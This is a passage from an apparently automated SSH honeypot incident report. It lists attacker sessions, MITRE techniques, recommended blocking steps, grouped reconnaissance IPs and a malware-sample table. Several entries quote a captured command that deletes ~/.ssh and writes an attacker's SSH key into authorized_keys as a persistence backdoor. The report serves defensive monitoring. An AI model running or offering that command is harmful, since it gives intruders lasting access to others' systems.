| `2026-06-07 13:53:20` | `cowrie.command.failed` |
| `2026-06-07 13:53:20` | `cowrie.log.closed` |
| `2026-06-07 13:53:20` | `cowrie.session.params` |
| `2026-06-07 13:53:20` | `cowrie.command.input` |
| `2026-06-07 13:53:20` | `cowrie.session.file_download` |
| `2026-06-07 13:53:20` | `cowrie.log.closed` |
| `2026-06-07 13:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7a45069e458

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:53 |
| **Last Seen** | 2026-06-07 13:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:53:21` | `cowrie.session.connect` |
| `2026-06-07 13:53:21` | `cowrie.client.version` |
| `2026-06-07 13:53:21` | `cowrie.client.kex` |
| `2026-06-07 13:53:21` | `cowrie.login.success` |
| `2026-06-07 13:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce448d76da67

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:55 |
| **Last Seen** | 2026-06-07 13:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:55:52` | `cowrie.session.connect` |
| `2026-06-07 13:55:52` | `cowrie.client.version` |
| `2026-06-07 13:55:52` | `cowrie.client.kex` |
| `2026-06-07 13:55:54` | `cowrie.login.success` |
| `2026-06-07 13:55:54` | `cowrie.session.params` |
| `2026-06-07 13:55:54` | `cowrie.command.input` |
| `2026-06-07 13:55:54` | `cowrie.command.failed` |
| `2026-06-07 13:55:55` | `cowrie.log.closed` |
| `2026-06-07 13:55:55` | `cowrie.session.params` |
| `2026-06-07 13:55:55` | `cowrie.command.input` |
| `2026-06-07 13:55:55` | `cowrie.session.file_download` |
| `2026-06-07 13:55:55` | `cowrie.log.closed` |
| `2026-06-07 13:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a87dcc5e5df8

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:55 |
| **Last Seen** | 2026-06-07 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:55:58` | `cowrie.session.connect` |
| `2026-06-07 13:55:58` | `cowrie.client.version` |
| `2026-06-07 13:55:58` | `cowrie.client.kex` |
| `2026-06-07 13:55:59` | `cowrie.login.success` |
| `2026-06-07 13:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbef023c7a39

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:57 |
| **Last Seen** | 2026-06-07 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:57:33` | `cowrie.session.connect` |
| `2026-06-07 13:57:33` | `cowrie.client.version` |
| `2026-06-07 13:57:33` | `cowrie.client.kex` |
| `2026-06-07 13:57:33` | `cowrie.login.success` |
| `2026-06-07 13:57:33` | `cowrie.session.params` |
| `2026-06-07 13:57:33` | `cowrie.command.input` |
| `2026-06-07 13:57:33` | `cowrie.command.failed` |
| `2026-06-07 13:57:33` | `cowrie.log.closed` |
| `2026-06-07 13:57:33` | `cowrie.session.params` |
| `2026-06-07 13:57:33` | `cowrie.command.input` |
| `2026-06-07 13:57:33` | `cowrie.session.file_download` |
| `2026-06-07 13:57:33` | `cowrie.log.closed` |
| `2026-06-07 13:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722a231ddc90

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:57 |
| **Last Seen** | 2026-06-07 13:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:57:34` | `cowrie.session.connect` |
| `2026-06-07 13:57:34` | `cowrie.client.version` |
| `2026-06-07 13:57:34` | `cowrie.client.kex` |
| `2026-06-07 13:57:34` | `cowrie.login.success` |
| `2026-06-07 13:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9efbd558820

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:57 |
| **Last Seen** | 2026-06-07 13:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:57:41` | `cowrie.session.connect` |
| `2026-06-07 13:57:41` | `cowrie.client.version` |
| `2026-06-07 13:57:41` | `cowrie.client.kex` |
| `2026-06-07 13:57:42` | `cowrie.login.success` |
| `2026-06-07 13:57:43` | `cowrie.session.params` |
| `2026-06-07 13:57:43` | `cowrie.command.input` |
| `2026-06-07 13:57:43` | `cowrie.command.failed` |
| `2026-06-07 13:57:43` | `cowrie.log.closed` |
| `2026-06-07 13:57:44` | `cowrie.session.params` |
| `2026-06-07 13:57:44` | `cowrie.command.input` |
| `2026-06-07 13:57:44` | `cowrie.session.file_download` |
| `2026-06-07 13:57:44` | `cowrie.log.closed` |
| `2026-06-07 13:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d291b7cf6b32

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:57 |
| **Last Seen** | 2026-06-07 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:57:47` | `cowrie.session.connect` |
| `2026-06-07 13:57:47` | `cowrie.client.version` |
| `2026-06-07 13:57:47` | `cowrie.client.kex` |
| `2026-06-07 13:57:48` | `cowrie.login.success` |
| `2026-06-07 13:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-818f7d5925ce

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:59 |
| **Last Seen** | 2026-06-07 13:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:59:03` | `cowrie.session.connect` |
| `2026-06-07 13:59:03` | `cowrie.client.version` |
| `2026-06-07 13:59:03` | `cowrie.client.kex` |
| `2026-06-07 13:59:03` | `cowrie.login.success` |
| `2026-06-07 13:59:04` | `cowrie.session.params` |
| `2026-06-07 13:59:04` | `cowrie.command.input` |
| `2026-06-07 13:59:04` | `cowrie.command.failed` |
| `2026-06-07 13:59:04` | `cowrie.log.closed` |
| `2026-06-07 13:59:04` | `cowrie.session.params` |
| `2026-06-07 13:59:04` | `cowrie.command.input` |
| `2026-06-07 13:59:04` | `cowrie.session.file_download` |
| `2026-06-07 13:59:04` | `cowrie.log.closed` |
| `2026-06-07 13:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fc223263c46

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:59 |
| **Last Seen** | 2026-06-07 13:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:59:06` | `cowrie.session.connect` |
| `2026-06-07 13:59:06` | `cowrie.client.version` |
| `2026-06-07 13:59:06` | `cowrie.client.kex` |
| `2026-06-07 13:59:06` | `cowrie.login.success` |
| `2026-06-07 13:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b43264e7e1

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:59 |
| **Last Seen** | 2026-06-07 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:59:43` | `cowrie.session.connect` |
| `2026-06-07 13:59:43` | `cowrie.client.version` |
| `2026-06-07 13:59:43` | `cowrie.client.kex` |
| `2026-06-07 13:59:44` | `cowrie.login.success` |
| `2026-06-07 13:59:44` | `cowrie.session.params` |
| `2026-06-07 13:59:44` | `cowrie.command.input` |
| `2026-06-07 13:59:44` | `cowrie.command.failed` |
| `2026-06-07 13:59:44` | `cowrie.log.closed` |
| `2026-06-07 13:59:44` | `cowrie.session.params` |
| `2026-06-07 13:59:44` | `cowrie.command.input` |
| `2026-06-07 13:59:44` | `cowrie.session.file_download` |
| `2026-06-07 13:59:44` | `cowrie.log.closed` |
| `2026-06-07 13:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c78c2f9749d2

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:59 |
| **Last Seen** | 2026-06-07 13:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:59:45` | `cowrie.session.connect` |
| `2026-06-07 13:59:45` | `cowrie.client.version` |
| `2026-06-07 13:59:45` | `cowrie.client.kex` |
| `2026-06-07 13:59:45` | `cowrie.login.success` |
| `2026-06-07 13:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.80[.]171` | **38** | 2026-06-07 11:56 | 2026-06-07 13:54 | 34m | 0 | `T1592` | 🟠 MEDIUM |
| `43.163.90[.]141` | **30** | 2026-06-07 11:52 | 2026-06-07 12:52 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `59.179.31[.]237` | **25** | 2026-06-07 11:59 | 2026-06-07 13:06 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **23** | 2026-06-07 11:51 | 2026-06-07 14:00 | 13m | 0 | `T1592` | 🟠 MEDIUM |
| `45.158.14[.]124` | **23** | 2026-06-07 11:50 | 2026-06-07 12:36 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.167.89[.]222` | **21** | 2026-06-07 13:08 | 2026-06-07 13:59 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.153.204[.]5` | **20** | 2026-06-07 12:41 | 2026-06-07 13:26 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.114[.]231` | **15** | 2026-06-07 11:50 | 2026-06-07 12:05 | 24m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.167.237[.]191` | **15** | 2026-06-07 13:23 | 2026-06-07 13:59 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.244.18[.]126` | **13** | 2026-06-07 13:26 | 2026-06-07 13:59 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `46.6.124[.]216` | **6** | 2026-06-07 13:20 | 2026-06-07 13:29 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `103.214.112[.]253` | **5** | 2026-06-07 12:59 | 2026-06-07 13:09 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `138.124.99[.]219` | **4** | 2026-06-07 12:57 | 2026-06-07 13:13 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `190.0.63[.]226` | **4** | 2026-06-07 11:56 | 2026-06-07 12:04 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `135.222.40[.]118` | **2** | 2026-06-07 13:26 | 2026-06-07 13:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.22.100[.]15` | **2** | 2026-06-07 12:39 | 2026-06-07 12:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.229.253[.]119` | **2** | 2026-06-07 13:28 | 2026-06-07 13:35 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]111` | **2** | 2026-06-07 12:12 | 2026-06-07 12:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `100.27.216[.]66` | 1 | 2026-06-07 13:10 | 2026-06-07 13:10 | 1s | 0 | `T1592` | 🟢 LOW |
| `101.126.11[.]137` | 1 | 2026-06-07 13:25 | 2026-06-07 13:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.186.48[.]70` | 1 | 2026-06-07 12:34 | 2026-06-07 12:34 | 12s | 0 | `T1592` | 🟢 LOW |
| `115.191.10[.]40` | 1 | 2026-06-07 13:25 | 2026-06-07 13:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.39.93[.]73` | 1 | 2026-06-07 13:02 | 2026-06-07 13:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `156.245.246[.]50` | 1 | 2026-06-07 13:05 | 2026-06-07 13:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.65.148[.]93` | 1 | 2026-06-07 12:43 | 2026-06-07 12:43 | 30s | 0 | `T1592` | 🟢 LOW |
| `222.107.156[.]227` | 1 | 2026-06-07 13:58 | 2026-06-07 13:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.112.46[.]78` | 1 | 2026-06-07 12:44 | 2026-06-07 12:45 | 30s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]81` | 1 | 2026-06-07 13:30 | 2026-06-07 13:30 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (33 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
